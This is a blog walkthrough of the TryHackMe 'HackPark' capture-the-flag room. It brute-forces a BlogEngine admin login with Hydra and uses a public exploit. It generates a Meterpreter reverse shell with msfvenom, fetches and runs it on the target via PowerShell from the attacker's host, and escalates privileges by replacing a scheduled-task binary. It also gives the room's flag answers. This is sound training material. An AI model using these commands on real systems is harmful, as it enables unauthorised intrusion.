---
title: TryHackMe Room Hackpark
date: 2021-06-19T19:38:27+05:30
lastmod: 2021-06-19T19:38:27+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://bit.ly/34sGFiK
cover:
  image: /img/thm.gif
  alt: "cover image"

categories:
  - TryHackMe
tags:
  - tryhackme
  - rooms
  - thm
  - HackPark

draft: false
description: TryHackMe Room HackPark solved by Animesh Roy. this is a walkthough. read more...

---
## HackPark

Room link : [HackPark](https://tryhackme.com/room/hackpark)

## task 01: Deploy the vulnerable Windows machine

This room will cover brute-forcing an accounts credentials, handling public exploits, using the Metasploit framework and privilege escalation on Windows.

### Flags

|Flag-ID|question|
|:--|---|
|1|Deploy the machine and access its web server.|
|2|Whats the name of the clown displayed on the homepage?|
||download the img and do a reverse Image search ans is `PENNYWISE`|

## task 02: Using Hydra to brute-force a login

![hydra](https://i.imgur.com/8wR5oby.png)

**1 : find the directory using `gobuster`**

```bash
gobuster dir -u http://10.10.135.139/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.135.139/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2021/06/19 20:08:03 Starting gobuster in directory enumeration mode
===============================================================
...[snip]...

/account              (Status: 301) [Size: 152] [--> http://10.10.135.139/account/]
/admin                (Status: 302) [Size: 173] [--> http://10.10.135.139/Account/login.aspx?ReturnURL=/admin]

...[snip]...
```

we got `/admin` dir here, let's check this out.

![img](https://i.imgur.com/Gf2QJCB.png)

### Flags 2.1

|Flag-ID|question|
|:--|---|
|1|What request type is the Windows website login form using?|
||`POST`|

### Flag  2.2

Hydra bruteforce command

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.135.139 http-post-form "/Account/login.aspx?ReturnURL=/admin:__VIEWSTATE=eRnxFX0KeP0JSP3NUgJuQNgMv0s2Vbi3LgmkZ1b13u5XVzxoWRsgjuZ1i9zBwladu1Sn2olX%2BOFslf3MYIG%2BlcCFhPNOo39g9aaorqmfZ93BBwYH%2BU66nHfBoPd6mu2nKWfs4%2FFZacIS%2Ff1LUkpUlG29J6pqWWdWu1XGrlgHl4lNicNd&__EVENTVALIDATION=fLvo1twKPtwoRdRfJPlthZ9VW0RmhUAGor8gmqwlkM3r%2BiRaQAOP97BUNWjE%2BbVSNzZnye1kEuI2S72bUGOZqDPu0E7weYfJPUYT6xHHJ0%2F8wMA8ovjF9GRdvpIR0cHRYE%2BLAC2eUQ5%2ByMBbSzIv92ZRoxDToB5I4z4eiaYaGYKRGxvj&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"
```

![img](https://i.imgur.com/0DSaivn.png)

---
<!-- Amazon Ads-->
<script type="text/javascript" language="javascript">
      var aax_size='300x250';
      var aax_pubname = 'anir0y-21';
      var aax_src='302';
    </script>
<script type="text/javascript" language="javascript" src="https://c.amazon-adsystem.com/aax2/assoc.js"></script>
<!-- Amazon Ads-->
---

## task 03:  Compromise the machine

Exploit-Database is a CVE (common vulnerability and exposures) archive of public exploits and corresponding vulnerable software, developed for the use of penetration testers and vulnerability researches. It is owned by Offensive Security (who are responsible for OSCP and Kali)

Exploit: [Exploit-DB](https://www.exploit-db.com/exploits/46353)

### Flag 3.1

**Now you have logged into the website, are you able to identify the version of the BlogEngine?**

![img](https://i.imgur.com/9Gi3vyr.png)

> add `CVE-` then the exploit ID

### flag 3.2

**What is the CVE?**

![anir0y](https://i.imgur.com/aCgsF9E.png)

### flag 3.3

**Who is the webserver running as?**

get the reverse connection working as mentioned in `exploit page`, once that done run `whoami` command to get the ans. 

![img](https://i.imgur.com/PciOlWs.png)

---

## task 04: Windows Privilege Escalation

* generate the shell 
  
```bash
┌──(anir0y㉿kali)-[~/…/thm/room/hackpark/www]
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.17.4.40 lport=1337 -f exe -o supershell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: supershell.exe
```

* msf.rc conf

```bash
┌──(anir0y㉿kali)-[~/share/thm/room/hackpark]
└─$ cat www/msf.rc 
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost 10.17.4.40
set lport 1337
set exitonsession false
exploit -j 
```

* run the listener
  
```bash
┌──(anir0y㉿kali)-[~/share/thm/room/hackpark]
└─$ msfconsole -q -r msf.rc 
```

* run the webserver (linux)

```bash
# Change dir where is your exe file located
sudo python3 -m http.server 80 
#my exe is supershell.exe.exe
```

* download shell on target

```powershell
# download 
c:\Windows\Temp>powershell -c "Invoke-WebRequest -Uri 'http://10.17.4.40/supershell.exe' -OutFile 'shell.exe'"
#execute
c:\Windows\Temp>.\shell.exe
```

* Msfconsole 

```zsh
msf6 exploit(multi/handler) > [*] Sending stage (200262 bytes) to 10.10.135.139
msf6 exploit(multi/handler) > [*] Meterpreter session 1 opened (10.17.4.40:1337 -> 10.10.135.139:49301) at 2021-06-19 21:01:05 +0530
```

* get root 

![getroot](https://i.imgur.com/FfBMkJj.png)

upload shell to `C:\Program Files (x86)\SystemScheduler` chage `shell.exe` to `Message.exe` 

### Flag 4.1

**Tip: You can generate the reverse-shell payload using msfvenom, upload it using your current netcat session and execute it manually!**
no ans required

### Flag 4.2

**What is the OS version of this windows machine?**

run sysinfo in meterpreter shell.

![msf](https://i.imgur.com/lUhkQkJ.png)

### Flag 4.3

**What is the name of the abnormal service running?**

``` WScheduler.exe ``` names as `WindowsScheduler`

### Flag 4.4

**What is the name of the binary you're supposed to exploit?**

`Message.exe`

* find the log in `C:\Program Files (x86)\SystemScheduler\Events`
  
```powershell
meterpreter > ls
Listing: C:\Program Files (x86)\SystemScheduler\Events
======================================================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100666/rw-rw-rw-  1926   fil   2019-08-05 03:35:19 +0530  20198415519.INI
100666/rw-rw-rw-  31219  fil   2019-08-05 03:36:01 +0530  20198415519.INI_LOG.txt
100666/rw-rw-rw-  290    fil   2020-10-03 03:20:12 +0530  2020102145012.INI
100666/rw-rw-rw-  186    fil   2021-06-19 19:45:08 +0530  Administrator.flg
100666/rw-rw-rw-  182    fil   2021-06-19 19:44:39 +0530  SYSTEM_svc.flg
100666/rw-rw-rw-  0      fil   2021-06-19 19:45:08 +0530  Scheduler.flg
100666/rw-rw-rw-  449    fil   2019-08-04 17:06:53 +0530  SessionInfo.flg
100666/rw-rw-rw-  0      fil   2021-06-19 19:44:39 +0530  service.flg
```

* read the log

```powershell
...[snip]...
06/19/21 08:52:33,Process Ended. PID:1852,ExitCode:4,Message.exe (Administrator)
06/19/21 08:53:01,Event Started Ok, (Administrator)
06/19/21 08:53:33,Process Ended. PID:1688,ExitCode:4,Message.exe (Administrator)
06/19/21 08:54:05,Event Started Ok, (Administrator)
...[snip]...
```

### Flag 4.5

**What is the user flag (on Jeffs Desktop)?**

we already have `admininstrator` shell to view flags.

![jeff](https://i.imgur.com/e13TbCz.png)

**What is the root flag?**

![root-flag](https://i.imgur.com/zQpqsZ0.png)

---

## Task 05: Privilege Escalation Without Metasploit

In this task we will escalate our privileges without the use of meterpreter/metasploit!
Firstly, we will pivot from our netcat session that we have established, to a more stable reverse shell.
Once we have established this we will use winPEAS to enumerate the system for potential vulnerabilities, before using this information to escalate to Administrator.

***Tools***

* winpeas: [Download](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASbat)

### Flag 5.1

Now we can generate a more stable shell using msfvenom, instead of using a meterpreter, This time let's set our payload to `windows/shell_reverse_tcp`

* used this [website](https://shell.anir0y.in/) to generate the shellcode.
* msf.rc
  
  ```bash
  #saved as shell.rc
  use exploit/multi/handler
  set payload windows/x64/shell_reverse_tcp 
  set lhost 10.17.4.40
  set lport 1337
  set exitonsession false
  exploit -j
  ```

* run listener
  `msfconsole -r shell.rc`

* upload the file
  `powershell -c "Invoke-WebRequest -Uri 'http://10.17.4.40/reverse.exe' -OutFile 'rev.exe'"`
* run the file



### Flag 5.2

Tip: It's common to find C:\Windows\Temp is world writable!

### Flag 5.3

WinPeas is a great tool which will enumerate the system and attempt to recommend potential vulnerabilities that we can exploit. The part we are most interested in for this room is the running processes!

> Using winPeas, what was the Original Install time? (This is date and time)
`8/3/2019, 10:43:23 AM`

  a `systeminfo.exe` commnd gives it away.

---

<!-- Amazon Ads-->

<script type="text/javascript" language="javascript">
      var aax_size='300x250';
      var aax_pubname = 'anir0y-21';
      var aax_src='302';
    </script>
<script type="text/javascript" language="javascript" src="https://c.amazon-adsystem.com/aax2/assoc.js"></script>
<!-- Amazon Ads-->

<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="anir0y" data-description="Support me on Buy me a coffee!" data-message="" data-color="#5F7FFF" data-position="Right" data-x_margin="18" data-y_margin="18"></script>

---
